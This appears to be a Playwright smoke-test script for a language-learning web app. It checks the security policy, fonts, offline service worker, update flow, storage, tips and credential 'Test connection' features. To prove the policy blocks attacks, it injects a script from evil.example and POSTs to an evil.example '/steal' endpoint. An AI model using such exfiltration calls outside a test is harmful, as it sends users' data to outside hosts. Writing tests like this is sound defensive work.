/* Browser test for the parts that protect and deliver the site: the content-security policy (the real one, with the real addresses), self-hosted
 * fonts, the offline copy (service worker) and its safe update, the "could not save" banner, protected storage, and the install/backup tips.
 * Usage: node tools/smoke-test-pwa.js        (needs Playwright; see smoke-test.js) */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');
const { chromium } = require('playwright');
const { server } = require('./test-static');

const root = path.join(__dirname, '..');
let failures = 0;
const check = (c, m) => { if (!c) { failures++; console.log('FAIL', m); } else console.log('ok  ', m); };
const IGNORE = ['evil.example'];

// a copy of the site, so a "new version" can be built without touching the real files
function copySite() {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shanlu-pwa-'));
  fs.cpSync(root, tmp, { recursive: true, filter: (p) => !/(^|\/)(node_modules|\.git|__pycache__|review|content)(\/|$)/.test(path.relative(root, p)) });
  return tmp;
}

(async () => {
  // the stamp must be current for the files as committed
  try { execFileSync('node', [path.join(root, 'tools', 'build-site.js'), '--check'], { stdio: 'pipe' }); check(true, 'the stamp step is current (versioned files, security policy and offline list match the files)'); }
  catch (e) { check(false, 'the stamp step is out of date: run node tools/build-site.js'); }

  const tmp = copySite();
  const srv = server(tmp, { csp: true, sw: true, realConfig: true, noCache: true });
  await new Promise((r) => srv.listen(0, r));
  const site = 'http://127.0.0.1:' + srv.address().port + '/';
  const browser = await chromium.launch();

  // ---------- the policy, the fonts and the files ----------
  const ctx = await browser.newContext({ viewport: { width: 1100, height: 900 }, acceptDownloads: true });
  const page = await ctx.newPage();
  const errors = [], hosts = new Set();
  page.on('console', (m) => { if (m.type() === 'error' && !IGNORE.some((h) => m.text().includes(h))) errors.push('console: ' + m.text().slice(0, 300) + ' @' + (m.location().url || '') + ':' + m.location().lineNumber); });
  page.on('pageerror', (e) => errors.push(String(e)));
  page.on('request', (r) => hosts.add(new URL(r.url()).hostname));
  await ctx.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI + (e.blockedURI === 'inline' ? ' [' + (e.sample || '') + ' @' + (e.sourceFile || '').split('/').pop() + ':' + e.lineNumber + ' ' + (e.target && e.target.outerHTML ? e.target.outerHTML.slice(0, 140) : String(e.target)) + ']' : '')));
  });
  await page.goto(site); await page.waitForSelector('.app');
  const vAtLoad = await page.evaluate(() => window.__csp.length);
  const html = await (await ctx.request.get(site)).text();
  check((html.match(/\son[a-zA-Z]+\s*=/g) || []).length === 0 && !/<[^>]+\son[a-z]+\s*=/i.test(fs.readFileSync(path.join(tmp, 'index.html'), 'utf8')), 'the page has no inline event attributes (onclick= and the like), which the policy forbids and newer Chrome reports one by one');
  const cspTag = (/http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html) || [])[1] || '';
  check(/script-src 'self'(;|$)/.test(cspTag) && !/unsafe-eval/.test(cspTag) && !/script-src[^;]*unsafe-inline/.test(cspTag), 'the page carries a policy that allows scripts only from this site (no inline, no eval)');
  check(/connect-src[^;]*api\.anthropic\.com/.test(cspTag) && /connect-src[^;]*dashscope-intl\.aliyuncs\.com/.test(cspTag) && /connect-src[^;]*api\.github\.com/.test(cspTag) && /connect-src[^;]*shanlu-friends\.alvinyu20\.workers\.dev/.test(cspTag), 'network calls are limited to Anthropic, Alibaba, GitHub and the friends server named in config.js');
  check(!/googleapis|gstatic/.test(html) && !/googleapis|gstatic/.test(fs.readFileSync(path.join(tmp, 'styles.css'), 'utf8')), 'nothing is loaded from Google Fonts any more');
  await page.locator('nav button', { hasText: 'Review' }).first().click().catch(() => {});
  await page.locator('nav button', { hasText: 'Word webs' }).first().click().catch(() => {});
  await page.waitForTimeout(300);
  const fontsOk = await page.evaluate(async () => {
    await document.fonts.ready;
    // ask for each face the way the page does, then confirm the browser really has it (check() is only true once it is loaded)
    await Promise.all([document.fonts.load('700 20px "Noto Serif SC"', '山路'), document.fonts.load('400 16px "Source Sans 3"', 'abc'), document.fonts.load('700 28px "Bricolage Grotesque"', 'nǐ hǎo')]);
    return { zh: document.fonts.check('700 20px "Noto Serif SC"', '山路'), sans: document.fonts.check('400 16px "Source Sans 3"', 'abc'), py: document.fonts.check('700 28px "Bricolage Grotesque"', 'nǐ hǎo'), loaded: Array.from(document.fonts).filter((f) => f.status === 'loaded').length };
  });
  check(fontsOk.zh && fontsOk.sans && fontsOk.py && fontsOk.loaded >= 3, 'the three typefaces load from this site (' + fontsOk.loaded + ' font files in use)');
  check(!Array.from(hosts).some((h) => h !== '127.0.0.1'), 'opening the site and two screens contacts no other address (' + Array.from(hosts).join(', ') + ')');
  const violations = await page.evaluate(() => window.__csp.slice());
  check(violations.length === 0 && errors.length === 0, 'the site runs under its own policy with no violation and no console error [' + violations.length + ' violations (' + vAtLoad + ' at load), ' + errors.length + ' errors] ' + violations.concat(errors).slice(0, 3).join(' | '));
  // the policy really bites, and really lets the app's own addresses through
  const probe = await page.evaluate(async () => {
    const out = {};
    // (Playwright's own evaluate is exempt from the eval rule, so eval is tried the way page code would: a timer given a string)
    window.__x = 0; setTimeout('window.__x = 1', 0);
    const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.appendChild(s);
    try { await fetch('https://evil.example/steal', { method: 'POST', body: 'x' }); out.fetchBlocked = false; } catch (e) { out.fetchBlocked = true; }
    await new Promise((r) => setTimeout(r, 200));
    out.violations = window.__csp.slice(); out.evalBlocked = window.__x === 0;
    return out;
  });
  check(probe.evalBlocked && probe.fetchBlocked && probe.violations.some((v) => /script-src.*(evil\.example|eval)/.test(v)) && probe.violations.some((v) => /connect-src.*evil\.example/.test(v)), 'code from another site, eval and a call to another address are blocked');
  for (const url of ['https://api.anthropic.com/v1/messages', 'https://dashscope-intl.aliyuncs.com/compatible-mode/v1/chat/completions', 'https://testws1.ap-southeast-1.maas.aliyuncs.com/compatible-mode/v1/chat/completions', 'https://api.github.com/gists', 'https://shanlu-friends.alvinyu20.workers.dev/api/health']) {
    await ctx.route(url, (r) => r.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, contentType: 'application/json', body: '{}' }));
  }
  await ctx.route('https://dashscope-result-sgp.oss-ap-southeast-1.aliyuncs.com/**', (r) => r.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, contentType: 'audio/wav', body: Buffer.alloc(64) }));
  const allowed = await page.evaluate(async () => {
    window.__csp.length = 0;
    const urls = ['https://api.anthropic.com/v1/messages', 'https://dashscope-intl.aliyuncs.com/compatible-mode/v1/chat/completions', 'https://testws1.ap-southeast-1.maas.aliyuncs.com/compatible-mode/v1/chat/completions', 'https://api.github.com/gists', 'https://shanlu-friends.alvinyu20.workers.dev/api/health'];
    const res = [];
    for (const u of urls) { try { await fetch(u); res.push(true); } catch (e) { res.push(false); } }
    const a = new Audio(); a.src = 'https://dashscope-result-sgp.oss-ap-southeast-1.aliyuncs.com/x.wav'; a.load();
    await new Promise((r) => setTimeout(r, 200));
    return { res, audioBlocked: window.__csp.some((v) => /media-src/.test(v)) };
  });
  check(allowed.res.every(Boolean) && !allowed.audioBlocked, 'the five addresses the app uses (and the Qwen voice clip host) are not blocked');

  // manifest and icons
  const man = JSON.parse(await (await ctx.request.get(site + 'manifest.webmanifest')).text());
  const iconStatus = await Promise.all(man.icons.map(async (i) => (await ctx.request.get(site + i.src)).status()));
  check(man.display === 'standalone' && man.start_url === './' && man.icons.length >= 3 && man.icons.some((i) => i.purpose === 'maskable') && iconStatus.every((s) => s === 200), 'the web manifest names an installable app with its icons (any and maskable)');
  check(/rel="apple-touch-icon"/.test(html) && /rel="manifest"/.test(html), 'the page links the manifest and an iPhone home-screen icon');

  // ---------- offline copy ----------
  await page.evaluate(() => navigator.serviceWorker.ready);
  await page.reload(); await page.waitForSelector('.app');
  const sw1 = await page.evaluate(async () => ({ controlled: !!navigator.serviceWorker.controller, names: await caches.keys(), version: document.querySelector('meta[name="shanlu-version"]').content }));
  check(sw1.controlled && sw1.names.length === 1 && sw1.names[0] === 'shanlu-' + sw1.version, 'the service worker controls the page and keeps one cache named after the version (' + sw1.names.join() + ')');
  const listed = (/const ASSETS = (\[[\s\S]*?\]);/.exec(fs.readFileSync(path.join(tmp, 'sw.js'), 'utf8')) || [])[1];
  const cachedUrls = await page.evaluate(async () => { const c = await caches.open((await caches.keys())[0]); return (await c.keys()).map((r) => new URL(r.url).pathname.replace(/^\//, '') + new URL(r.url).search); });
  check(JSON.parse(listed).length === cachedUrls.length && JSON.parse(listed).every((u) => cachedUrls.indexOf(u === 'index.html' ? 'index.html' : u) >= 0), 'every file the page needs is stored (' + cachedUrls.length + ' files)');
  await ctx.setOffline(true);
  await page.reload(); await page.waitForSelector('.app');
  const offline = await page.evaluate(() => ({ text: document.querySelector('main').innerText.length, verb: !!window.shanlu }));
  check(offline.verb && offline.text > 50, 'with no connection the site still opens');
  await page.goto(site + '?level=1'); await page.waitForSelector('.app');
  check(await page.locator('.app').count() === 1, '...also from an address with ?level=');
  await ctx.setOffline(false);

  // a new version: downloaded in the background, switched only on the person's say-so
  fs.appendFileSync(path.join(tmp, 'app.js'), '\n// a later version\n');
  execFileSync('node', [path.join(tmp, 'tools', 'build-site.js')], { stdio: 'pipe' });
  const newVersion = (/shanlu-version" content="([0-9a-f]+)"/.exec(fs.readFileSync(path.join(tmp, 'index.html'), 'utf8')) || [])[1];
  check(newVersion && newVersion !== sw1.version, 'a changed script gets a new version number (' + sw1.version + ' to ' + newVersion + ')');
  await page.evaluate(() => window.shanlu.swReg.update());
  await page.waitForSelector('text=A new version of Shanlu is ready');
  const stillOld = await page.evaluate(() => document.querySelector('meta[name="shanlu-version"]').content);
  check(stillOld === sw1.version, 'the new version waits: the open page keeps its own matching files until Reload is pressed');
  await page.locator('button', { hasText: 'Reload now' }).click();
  await page.waitForFunction((v) => document.querySelector('meta[name="shanlu-version"]') && document.querySelector('meta[name="shanlu-version"]').content === v, newVersion);
  await page.waitForSelector('.app');
  const names = await page.evaluate(async () => await caches.keys());
  check(names.length === 1 && names[0] === 'shanlu-' + newVersion, 'after Reload the page runs the new version and the old copy is deleted');

  // ---------- a save that fails ----------
  await page.evaluate(() => { window.__realSet = Storage.prototype.setItem; Storage.prototype.setItem = function () { throw new DOMException('full', 'QuotaExceededError'); }; });
  await page.evaluate(() => { const a = window.shanlu; a.setState({ xp: a.state.xp + 1 }); });
  await page.waitForSelector('text=could not save your progress', { timeout: 3000 });
  check(await page.locator('.banner.bad button', { hasText: 'Download a backup' }).count() === 1, 'when saving fails a banner says so and offers a backup');
  const dl = page.waitForEvent('download');
  await page.locator('.banner.bad button', { hasText: 'Download a backup' }).click();
  check(/^shanlu-progress-/.test((await dl).suggestedFilename()), 'the backup downloads even though the browser storage is full');
  await page.evaluate(() => { Storage.prototype.setItem = window.__realSet; });
  await page.evaluate(() => { const a = window.shanlu; a.setState({ xp: a.state.xp + 1 }); });
  await page.waitForFunction(() => !document.body.innerText.includes('could not save your progress'), null, { timeout: 3000 });
  check(true, 'the banner goes away at the next successful save');

  // ---------- protected storage ----------
  const pctx = await browser.newContext({ viewport: { width: 1100, height: 900 } });
  await pctx.addInitScript(() => {
    window.__persistCalls = 0;
    try { Object.defineProperty(navigator, 'storage', { value: { persisted: async () => window.__persistCalls > 0, persist: async () => { window.__persistCalls++; return true; }, estimate: async () => ({}) }, configurable: true }); } catch (e) {}
  });
  const pp = await pctx.newPage();
  await pp.goto(site); await pp.waitForSelector('.app');
  check(await pp.evaluate(() => window.__persistCalls) === 0, 'a brand-new visitor is not asked for protected storage (nothing to protect yet)');
  await pp.evaluate(() => { const a = window.shanlu; a.setState({ xp: 5 }); });
  await pp.waitForFunction(() => window.__persistCalls === 1);
  await pp.waitForFunction(() => window.shanlu.state.storagePersisted === true);
  await pp.evaluate(() => window.shanlu.go('voice'));
  check((await pp.locator('main').innerText()).includes('Protected: the browser has agreed'), 'once there is progress, protected storage is requested and Settings shows the answer');
  check((await pp.locator('main').innerText()).includes('Version ' + newVersion), 'Settings shows the version number');
  await pctx.close();

  // ---------- the tips ----------
  const started = (n) => { const ws = {}; ['你好', '谢谢', '再见', '朋友', '老师', '学生', '学校', '工作', '医院', '商店', '火车', '飞机', '苹果', '米饭', '水果', '茶', '咖啡', '电话', '电脑', '手机', '书', '桌子'].slice(0, n).forEach((z) => { ws[z] = { see: { s: 3, t: Date.now(), d: 5 } }; }); return { ws, xp: 50, streak: 2, lastActive: '', day: '' }; };
  const iphone = await browser.newContext({ userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1', viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });
  await iphone.addInitScript((st) => { if (!localStorage.getItem('shanlu-progress-v1')) localStorage.setItem('shanlu-progress-v1', JSON.stringify(st)); }, started(8));
  const ip = await iphone.newPage();
  await ip.goto(site); await ip.waitForSelector('.app');
  await ip.waitForSelector('text=Put Shanlu on your home screen');
  check((await ip.locator('.banner').first().innerText()).includes('Add to Home Screen'), 'on an iPhone in Safari, a returning learner is told how to add the site to the home screen');
  await ip.locator('.banner button', { hasText: 'Not now' }).click();
  await ip.reload(); await ip.waitForSelector('.app'); await ip.waitForTimeout(400);
  check(await ip.locator('text=Put Shanlu on your home screen').count() === 0, 'and once dismissed it stays away for a while');
  await iphone.close();
  const fresh = await browser.newContext({ userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1', viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true });
  const fp = await fresh.newPage(); await fp.goto(site); await fp.waitForSelector('.app'); await fp.waitForTimeout(400);
  check(await fp.locator('text=Put Shanlu on your home screen').count() === 0, 'a brand-new visitor is not nagged');
  await fresh.close();
  const desk = await browser.newContext({ viewport: { width: 1100, height: 900 }, acceptDownloads: true });
  await desk.addInitScript((st) => { if (!localStorage.getItem('shanlu-progress-v1')) localStorage.setItem('shanlu-progress-v1', JSON.stringify(st)); }, started(22));
  const dp = await desk.newPage(); await dp.goto(site); await dp.waitForSelector('.app');
  await dp.waitForSelector('text=Your progress lives only in this browser');
  check(await dp.locator('text=Put Shanlu on your home screen').count() === 0, 'with nothing syncing, a learner with real progress is reminded to back up');
  const dl2 = dp.waitForEvent('download');
  await dp.locator('.banner button', { hasText: 'Download a backup' }).click(); await dl2;
  await dp.waitForTimeout(300);
  check(await dp.locator('text=Your progress lives only in this browser').count() === 0 && await dp.evaluate(() => !!JSON.parse(localStorage.getItem('shanlu-tips')).lastBackup), 'making a backup removes the reminder');
  await desk.close();

  // ---------- "Test connection" for the Claude key, the GitHub token and the friends server ----------
  const tctx = await browser.newContext({ viewport: { width: 1100, height: 1500 } });
  await tctx.addInitScript(() => {
    if (!localStorage.getItem('shanlu-ai')) localStorage.setItem('shanlu-ai', JSON.stringify({ key: 'sk-ant-test', provider: 'anthropic', model: 'claude-haiku-5-5' }));
    if (!localStorage.getItem('shanlu-sync')) localStorage.setItem('shanlu-sync', JSON.stringify({ token: 'ghp_test', gist: 'g1', at: 0 }));
    if (!localStorage.getItem('shanlu-friends')) localStorage.setItem('shanlu-friends', JSON.stringify({ id: 'abc', key: 'sekret', name: 'Mei', group: 'Crew' }));
  });
  const cors = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*', 'access-control-expose-headers': 'x-oauth-scopes,github-authentication-token-expiration' };
  const net = { gh: { status: 200, headers: { 'x-oauth-scopes': 'gist', 'github-authentication-token-expiration': '2027-03-04 10:00:00 UTC' } }, models: 200, messages: 200, health: 200, group: 200 };
  await tctx.route('https://api.github.com/**', (r) => r.request().method() === 'OPTIONS' ? r.fulfill({ status: 204, headers: cors }) : r.fulfill({ status: net.gh.status, headers: Object.assign({}, cors, net.gh.headers), contentType: 'application/json', body: '[]' }));
  await tctx.route('https://api.anthropic.com/**', (r) => {
    if (r.request().method() === 'OPTIONS') return r.fulfill({ status: 204, headers: cors });
    const st = /models/.test(r.request().url()) ? net.models : net.messages;
    r.fulfill({ status: st, headers: cors, contentType: 'application/json', body: JSON.stringify(st === 200 ? { data: [], content: [{ type: 'text', text: 'OK' }] } : { error: { type: 'x' } }) });
  });
  await tctx.route('https://shanlu-friends.alvinyu20.workers.dev/**', (r) => {
    const u = r.request().url();
    if (r.request().method() === 'OPTIONS') return r.fulfill({ status: 204, headers: cors });
    let st = 200, body = {};
    if (/health/.test(u)) { st = net.health; body = { ok: true }; }
    else if (/api\/group/.test(u)) { st = net.group; body = st === 200 ? { group: { name: 'Crew' }, me: 'abc', now: Date.now(), members: [{ id: 'abc', name: 'Mei', joined: 1, updated: 1, stats: null, cheers: 0, cheered: false }] } : { error: 'unauthorized' }; }
    else if (/me\/progress/.test(u)) body = { progress: null, updated: 0 };
    r.fulfill({ status: st, headers: cors, contentType: 'application/json', body: JSON.stringify(body) });
  });
  const tp = await tctx.newPage();
  await tp.goto(site); await tp.waitForSelector('.app');
  await tp.evaluate(() => window.shanlu.go('voice'));
  const card = (h) => tp.locator('section.card', { has: tp.locator('h2', { hasText: h }) });
  const syncBtn = card('Sync across devices').locator('button', { hasText: 'Test connection' });
  await syncBtn.click();
  await tp.waitForSelector('text=GitHub accepts the token.');
  let t = await card('Sync across devices').innerText();
  check(/It expires Mar 4, 2027\./.test(t) && /private progress gist is there/.test(t), 'GitHub test: a good token reports its expiry date and that the progress gist is there');
  net.gh.status = 401; await syncBtn.click();
  await tp.waitForSelector('text=GitHub rejected the token');
  check(true, 'GitHub test: a rejected token says so');
  net.gh.status = 200; net.gh.headers['x-oauth-scopes'] = 'repo'; await syncBtn.click();
  await tp.waitForSelector('text=does not have the gist permission');
  check(true, 'GitHub test: a token without the gist permission says so');
  const aiBtn = card('AI conversation').locator('button', { hasText: 'Test connection' });
  await aiBtn.click();
  await tp.waitForSelector('text=Chat model (claude-haiku-5-5): working.');
  check((await card('AI conversation').innerText()).includes('The key is accepted by Anthropic.'), 'Claude test: a good key is accepted and the chat model answers');
  net.messages = 402; await aiBtn.click();
  await tp.waitForSelector('text=has no credit yet');
  check(true, 'Claude test: a key without credit is explained');
  net.models = 401; await aiBtn.click();
  await tp.waitForSelector('text=Anthropic rejected the key');
  check(!(await card('AI conversation').innerText()).includes('Chat model ('), 'Claude test: a rejected key stops after the key check (no message is sent)');
  await tp.evaluate(() => window.shanlu.go('friends'));
  await tp.waitForSelector('button:has-text("Test connection")');
  await tp.locator('button', { hasText: 'Test connection' }).click();
  await tp.waitForSelector('text=The friends server answers');
  check((await tp.locator('.frd').innerText()).includes('signed in to Crew'), 'Friends test: the server answers and this device is signed in to its group');
  net.group = 401; await tp.locator('button', { hasText: 'Test connection' }).click();
  await tp.waitForSelector('text=no longer accepts this device');
  check(true, 'Friends test: a key the server no longer accepts is explained');
  net.health = 500; net.group = 200; await tp.locator('button', { hasText: 'Test connection' }).click();
  await tp.waitForSelector('.banner.err');
  check(true, 'Friends test: a server error shows an error banner');
  await tctx.close();

  await browser.close(); srv.close();
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log(failures ? failures + ' pwa check(s) failed' : 'all pwa checks passed');
  process.exit(failures ? 1 : 0);
})();
